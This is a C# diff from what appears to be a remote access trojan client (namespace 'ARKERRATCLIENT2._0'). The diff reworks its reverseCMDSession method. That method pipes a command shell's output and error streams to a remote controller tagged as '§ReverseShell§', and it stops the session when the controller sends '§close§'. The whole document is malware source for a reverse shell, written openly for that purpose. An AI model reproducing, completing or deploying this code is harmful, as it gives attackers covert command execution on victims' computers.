@@ -17,7 +17,7 @@ namespace ARKERRATCLIENT2._0
        static string StandardError = "";
 
 
-        public static async void reverseCMDSession(string data)
+        public static void reverseCMDSession(string data)
         {
             if (!hasStarted)
             {
@@ -32,37 +32,42 @@ namespace ARKERRATCLIENT2._0
                 hasStarted = true;
 
                //FUNGEWRAR EJ MED STANDARERROR
-                await Task.Run(async () =>
+                Task.Run(async () =>
                 {
+                   
                     while (hasStarted && !RATClientSession.noConnection)
                     {
-                        try
+                       await Task.Run(async() =>
                         {
-                            if (StandardError.Length > 1)
-                            {
-                                await RATClientSession.SendData(StandardError + "§ReverseShell§\n");
-                                StandardError = "";
-                            }
-                            else
-                            {
-                                await RATClientSession.SendData(cmd.StandardOutput.ReadLine().Trim(' ') + "§ReverseShell§\n");
-                            }
-                        }
-                        catch { }
-                    }
-                });
 
-                await Task.Run(() =>
-                {
-                    while (hasStarted && !RATClientSession.noConnection)
-                    {
-                        try
+                            try
+                            {
+                                if (StandardError.Length > 1)
+                                {
+                                    await RATClientSession.SendData(StandardError + "§ReverseShell§ \n");
+                                    StandardError = "";
+                                }
+                                else
+                                {
+                                    await RATClientSession.SendData(cmd.StandardOutput.ReadLine() + "§ReverseShell§ \n");
+                                }
+                            }
+                            catch { }
+
+                        });
+                        Task.Run(() =>
                         {
-                            StandardError = cmd.StandardError.ReadLine().Trim(' ');
-                        }
-                        catch { }
+                            try
+                            {
+                                StandardError += cmd.StandardError.ReadLine();
+                            }
+                            catch { }
+                        });
+                        
                     }
                 });
+                
+               
             }
             
             if (data.Contains("§close§") || RATClientSession.noConnection)
